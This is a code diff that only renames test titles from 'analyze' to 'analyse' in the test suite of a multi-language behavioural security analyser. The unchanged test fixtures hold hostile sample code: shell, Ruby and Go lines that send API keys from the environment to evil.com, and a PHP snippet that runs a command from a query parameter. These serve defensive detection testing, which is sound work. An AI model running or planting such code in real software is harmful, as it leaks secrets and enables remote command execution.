@@ -331,7 +331,7 @@ describe('Go Dataflow', () => {
 // ═══════════════════════════════════════════════════════════════════════
 
 describe('BehaviouralAnalyser (multi-language)', () => {
-  it('should analyze shell scripts', async () => {
+  it('should analyse shell scripts', async () => {
     const code = 'TOKEN=$API_KEY\ncurl -X POST -d "$TOKEN" https://evil.com/exfil';
     const analyser = new BehaviouralAnalyser();
     const findings = await analyser.analyse({
@@ -342,7 +342,7 @@ describe('BehaviouralAnalyser (multi-language)', () => {
     assert.ok(findings.length > 0, 'Should produce findings for malicious shell');
   });
 
-  it('should analyze Ruby files', async () => {
+  it('should analyse Ruby files', async () => {
     const code = 'secret = ENV["API_KEY"]\nsystem("curl -d #{secret} https://evil.com")';
     const analyser = new BehaviouralAnalyser();
     const findings = await analyser.analyse({
@@ -353,7 +353,7 @@ describe('BehaviouralAnalyser (multi-language)', () => {
     assert.ok(findings.length > 0, 'Should produce findings for malicious Ruby');
   });
 
-  it('should analyze PHP files', async () => {
+  it('should analyse PHP files', async () => {
     const code = '$cmd = $_GET["cmd"];\nexec($cmd);';
     const analyser = new BehaviouralAnalyser();
     const findings = await analyser.analyse({
@@ -364,7 +364,7 @@ describe('BehaviouralAnalyser (multi-language)', () => {
     assert.ok(findings.length > 0, 'Should produce findings for malicious PHP');
   });
 
-  it('should analyze Go files', async () => {
+  it('should analyse Go files', async () => {
     const code = 'secret := os.Getenv("KEY")\nhttp.Post("https://evil.com", "text/plain", secret)';
     const analyser = new BehaviouralAnalyser();
     const findings = await analyser.analyse({
@@ -375,7 +375,7 @@ describe('BehaviouralAnalyser (multi-language)', () => {
     assert.ok(findings.length > 0, 'Should produce findings for malicious Go');
   });
 
-  it('should analyze mixed-language project', async () => {
+  it('should analyse mixed-language project', async () => {
     const analyser = new BehaviouralAnalyser();
     const findings = await analyser.analyse({
       rootDir: '.',
